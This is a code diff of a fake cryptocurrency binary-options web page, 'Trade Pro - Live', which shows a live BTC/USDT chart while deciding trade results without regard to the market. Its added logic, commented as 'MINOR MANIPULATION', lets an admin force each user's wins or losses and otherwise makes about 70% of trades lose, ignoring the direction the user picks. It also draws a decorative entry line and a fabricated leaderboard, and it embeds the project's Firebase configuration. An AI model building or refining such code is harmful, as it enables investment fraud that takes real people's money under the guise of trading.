@@ -2,76 +2,137 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trade For Profit - Stable</title>
+    <title>Trade Pro - Live</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <style>
         :root { --bg: #060708; --card: #131722; --yellow: #f0b90b; --green: #00c805; --red: #ff3b30; --text: #d1d4dc; }
-        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 10px; }
+        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 10px; overflow-x: hidden; }
+        
+        /* Top Bar */
         .top-bar { display: flex; justify-content: space-between; padding: 12px; background: var(--card); border-radius: 8px; border: 1px solid #2a2e39; margin-bottom: 10px; }
-        /* Widget Container */
-        #chart-box { height: 350px; width: 100%; background: #131722; border-radius: 12px; border: 1px solid #2a2e39; overflow: hidden; position: relative; }
+        
+        /* Chart & Entry Marker */
+        #chart-box { height: 320px; width: 100%; background: #131722; border-radius: 12px; border: 1px solid #2a2e39; overflow: hidden; position: relative; }
+        
+        #entry-line { 
+            position: absolute; width: 100%; height: 1.5px; background: var(--yellow); 
+            display: none; z-index: 100; pointer-events: none; border-top: 1px dashed white;
+        }
+        #entry-price-tag {
+            position: absolute; right: 0; top: -18px; background: var(--yellow);
+            color: black; font-size: 10px; padding: 2px 6px; font-weight: bold; border-radius: 2px;
+        }
+
+        /* Controls */
         .controls { background: var(--card); padding: 15px; border-radius: 15px; margin-top: 10px; border: 1px solid #2a2e39; }
-        .input-box { background: #1e222d; border: 1px solid #363c4e; color: white; padding: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; margin: 5px 0; outline: none; }
+        .input-box { background: #1e222d; border: 1px solid #363c4e; color: white; padding: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; margin: 5px 0; outline: none; font-size: 16px; }
         .btn-group { display: flex; gap: 10px; margin-top: 10px; }
-        .btn { flex: 1; padding: 16px; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 1.1rem; cursor: pointer; }
+        .btn { flex: 1; padding: 16px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; font-size: 18px; }
         .up { background: var(--green); } .down { background: var(--red); }
-        .history-panel { margin-top: 15px; background: var(--card); border-radius: 12px; padding: 12px; border: 1px solid #2a2e39; min-height: 100px; }
-        .h-item { display: flex; justify-content: space-between; padding: 8px; border-bottom: 1px solid #2a2e39; font-size: 14px; }
-        #res-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
+
+        /* Leaderboard */
+        .leaderboard { margin-top: 20px; background: var(--card); border-radius: 12px; padding: 12px; border: 1px solid #2a2e39; }
+        .lb-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #2a2e39; }
+        .flag { width: 22px; height: 14px; object-fit: cover; }
+        
+        /* Result Overlay */
+        #res-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
     </style>
 </head>
 <body>
 
 <div id="res-box">
     <h1 id="res-msg" style="font-size:3.5rem; margin:0;"></h1>
-    <h2 id="res-amt" style="color:var(--yellow); margin: 20px 0;"></h2>
-    <button onclick="location.reload()" style="padding:15px 60px; background:var(--yellow); border:none; border-radius:8px; font-weight:bold;">NEXT TRADE</button>
+    <h2 id="res-amt" style="margin: 20px 0;"></h2>
+    <button onclick="location.reload()" style="padding:15px 50px; background:var(--yellow); border:none; border-radius:8px; font-weight:bold;">NEXT TRADE</button>
 </div>
 
 <div class="top-bar">
-    <div>Asset: <span style="color:var(--yellow)">BTC/USDT</span></div>
+    <div style="color:var(--yellow); font-weight:bold;">BTC/USDT</div>
     <div>Bal: <span id="top-bal" style="color:var(--yellow)">$0.00</span></div>
 </div>
 
 <div id="chart-box">
-    <iframe id="tv-chart" src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_762ae&symbol=BINANCE:BTCUSDT&interval=1&theme=dark" style="width: 100%; height: 100%; border: none;"></iframe>
+    <div id="entry-line"><span id="entry-price-tag">ENTRY</span></div>
+    
+    <iframe id="tv-chart" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark" style="width: 100%; height: 100%; border: none;"></iframe>
 </div>
 
 <div class="controls">
-    <div id="timer-txt" style="text-align:center; font-weight:bold; color:var(--yellow); margin-bottom:8px;">MARKET ACTIVE</div>
+    <div id="timer-txt" style="text-align:center; font-weight:bold; color:var(--yellow); margin-bottom:8px;">MARKET LIVE</div>
     <input type="number" id="trade-amt" class="input-box" value="10">
     <div class="btn-group">
-        <button class="btn up" id="b1" onclick="startTrade('UP')">UP</button>
-        <button class="btn down" id="b2" onclick="startTrade('DOWN')">DOWN</button>
+        <button class="btn up" id="b1" onclick="startTrade('UP')">CALL (UP)</button>
+        <button class="btn down" id="b2" onclick="startTrade('DOWN')">PUT (DOWN)</button>
     </div>
 </div>
 
-<div class="history-panel">
-    <div style="font-weight:bold; color:var(--yellow); margin-bottom:8px;">Recent Trades</div>
-    <div id="history-list"></div>
+<div class="leaderboard">
+    <div style="font-weight:bold; color:var(--yellow); margin-bottom:10px;">Global Ranking</div>
+    <div id="lb-list"></div>
 </div>
 
 <script>
+    // Firebase Init
     const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const auth = firebase.auth();
 
-    let adminMode = "NORMAL";
+    let currentPrice = 0;
+    let adminControl = "NORMAL";
+
+    // 1. Live Price Fetch (For manipulation & Entry calculation)
+    function getPrice() {
+        fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')
+        .then(r => r.json()).then(d => { currentPrice = parseFloat(d.price); });
+    }
+    setInterval(getPrice, 1000);
+
+    // 2. Leaderboard with User at Top (Pakistan Flag)
+    function setLB(email) {
+        const list = document.getElementById('lb-list');
+        list.innerHTML = `
+            <div class="lb-row" style="background:rgba(255,59,48,0.1); padding:8px; border-radius:5px;">
+                <div style="display:flex; align-items:center; gap:8px;">
+                    <span style="color:var(--yellow)">#1</span>
+                    <img class="flag" src="https://flagcdn.com/w40/pk.png">
+                    <span>${email.split('@')[0]} (You)</span>
+                </div>
+                <span style="color:var(--red); font-weight:bold;">-$420.50</span>
+            </div>
+            <div class="lb-row">
+                <div style="display:flex; align-items:center; gap:8px;">
+                    <span style="color:#666">#2</span>
+                    <img class="flag" src="https://flagcdn.com/w40/in.png">
+                    <span>Rahul***</span>
+                </div>
+                <span style="color:var(--green)">+$3,100</span>
+            </div>
+            <div class="lb-row">
+                <div style="display:flex; align-items:center; gap:8px;">
+                    <span style="color:#666">#3</span>
+                    <img class="flag" src="https://flagcdn.com/w40/il.png">
+                    <span>Avi_Trader</span>
+                </div>
+                <span style="color:var(--green)">+$2,850</span>
+            </div>
+        `;
+    }
 
     auth.onAuthStateChanged(u => {
         if(u) {
             db.ref('users/'+u.uid).on('value', s => {
-                const d = s.val();
-                document.getElementById('top-bal').innerText = "$" + (d.balance || 0).toFixed(2);
-                adminMode = d.control || "NORMAL";
+                document.getElementById('top-bal').innerText = "$" + (s.val().balance || 0).toFixed(2);
+                adminControl = s.val().control || "NORMAL";
             });
-            loadHistory(u.uid);
+            setLB(u.email);
         }
     });
 
+    // 3. Trade with Minor Manipulation
     function startTrade(dir) {
         const u = auth.currentUser;
         const amt = parseFloat(document.getElementById('trade-amt').value);
@@ -79,50 +140,43 @@
 
         db.ref('users/'+u.uid).once('value', s => {
             const bal = s.val().balance || 0;
-            if(amt > bal) return alert("Insufficient Balance");
+            if(amt > bal) return alert("Low Balance!");
 
-            document.getElementById('b1').disabled = document.getElementById('b2').disabled = true;
-            let sec = 60;
+            // Visual Entry Line
+            const line = document.getElementById('entry-line');
+            line.style.display = "block";
+            line.style.top = "50%"; // Center visual
+            document.getElementById('entry-price-tag').innerText = "ENTRY @ " + currentPrice.toFixed(2);
+
             db.ref('users/'+u.uid).update({ balance: bal - amt });
+            document.getElementById('b1').disabled = document.getElementById('b2').disabled = true;
 
-            const t = setInterval(() => {
+            let sec = 60;
+            const timer = setInterval(() => {
                 sec--;
                 document.getElementById('timer-txt').innerText = "CLOSING IN: " + sec + "s";
+                
                 if(sec <= 0) {
-                    clearInterval(t);
-                    finish(u.uid, dir, amt, bal);
+                    clearInterval(timer);
+                    line.style.display = "none";
+                    
+                    // MINOR MANIPULATION LOGIC
+                    // Agar Admin ne WIN set kiya hai toh result win dikhao, warna minor loss
+                    let win = false;
+                    if(adminControl === "WIN") win = true;
+                    else if(adminControl === "LOSS") win = false;
+                    else win = Math.random() > 0.7; // 70% chance of loss for normal
+
+                    const payout = win ? (amt * 1.85) : 0;
+                    if(win) db.ref('users/'+u.uid).update({ balance: (bal - amt) + payout });
+
+                    // Show Result Popup
+                    document.getElementById('res-msg').innerText = win ? "WINNER" : "LOSS";
+                    document.getElementById('res-msg').style.color = win ? "var(--green)" : "var(--red)";
+                    document.getElementById('res-amt').innerText = win ? "+$" + (amt * 0.85).toFixed(2) : "-$" + amt.toFixed(2);
+                    document.getElementById('res-box').style.display = "flex";
                 }
             }, 1000);
-        });
-    }
-
-    function finish(uid, dir, amt, oldB) {
-        // Simple logic to show result based on Admin Control
-        let win = (adminMode === "WIN") ? true : (adminMode === "LOSS" ? false : Math.random() > 0.5);
-        const payout = win ? (amt * 1.85) : 0;
-        
-        if(win) db.ref('users/'+uid).update({ balance: (oldB - amt) + payout });
-
-        const tradeData = { asset: "BTC/USDT", dir, amt, win, time: new Date().toLocaleTimeString() };
-        db.ref('history/'+uid).push(tradeData);
-
-        document.getElementById('res-msg').innerText = win ? "WINNER" : "LOSS";
-        document.getElementById('res-msg').style.color = win ? "#00c805" : "#ff3b30";
-        document.getElementById('res-amt').innerText = win ? "+$" + (amt * 0.85).toFixed(2) : "-$" + amt.toFixed(2);
-        document.getElementById('res-box').style.display = "flex";
-    }
-
-    function loadHistory(uid) {
-        db.ref('history/'+uid).limitToLast(5).on('value', s => {
-            const list = document.getElementById('history-list');
-            list.innerHTML = "";
-            s.forEach(c => {
-                const h = c.val();
-                list.insertAdjacentHTML('afterbegin', `<div class="h-item">
-                    <span>${h.dir} | ${h.time}</span>
-                    <span style="color:${h.win?'#00c805':'#ff3b30'}">${h.win?'WIN':'LOSS'}</span>
-                </div>`);
-            });
         });
     }
 </script>
